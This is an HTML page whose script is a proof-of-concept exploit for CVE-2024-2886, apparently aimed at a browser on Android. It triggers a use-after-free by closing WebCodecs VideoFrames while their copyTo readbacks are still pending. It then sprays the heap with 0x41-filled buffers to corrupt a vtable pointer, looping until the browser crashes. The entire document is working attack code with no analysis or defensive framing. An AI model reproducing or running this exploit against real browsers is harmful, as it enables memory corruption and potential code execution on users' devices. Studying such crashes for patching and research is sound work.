<!doctype html>
<html>
<head><title>q1shell - crash</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };

async function crash() {
    log('CVE-2024-2886 — intentional crash for tombstone analysis');
    log('');

    const canvas = new OffscreenCanvas(64, 64);
    const gl = canvas.getContext('webgl');

    // Aggressively trigger UAF to force a real crash
    // Instead of await-ing the promise, fire many simultaneously
    // and try to corrupt the vtable call

    let attempt = 0;
    let crashed = false;

    while (!crashed) {
        attempt++;
        
        // Create many frames simultaneously
        const frames = [];
        const promises = [];
        const bufs = [];

        for (let i = 0; i < 50; i++) {
            gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.finish();
            
            const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 + i });
            const buf = new Uint8Array(frame.allocationSize());
            bufs.push(buf);
            
            // Start async readback
            const p = frame.copyTo(buf);
            promises.push(p);
            frames.push(frame);
        }

        // Free ALL frames immediately while ALL readbacks are pending
        for (const f of frames) {
            f.close();
        }

        // Now aggressively allocate to try to reclaim freed memory
        // with garbage that will corrupt the vtable pointer
        const trash = [];
        for (let i = 0; i < 2000; i++) {
            // Allocate various sizes to hit the right bucket
            trash.push(new Uint8Array(32).fill(0x41));
            trash.push(new Uint8Array(64).fill(0x41));
            trash.push(new Uint8Array(128).fill(0x41));
        }

        try {
            await Promise.all(promises);
            trash.length = 0;
            
            if (attempt % 10 === 0) {
                log('attempt ' + attempt + ' — still no crash, continuing...');
            }
        } catch(e) {
            log('ERROR on attempt ' + attempt + ': ' + e.message);
            // If we see an error here the vtable might be corrupted
            crashed = true;
        }

        if (attempt > 200) {
            log('200 attempts done — crash may need more aggressive approach');
            log('Check logcat for tombstone anyway');
            break;
        }
    }
}

crash();
</script>
</body>
</html>
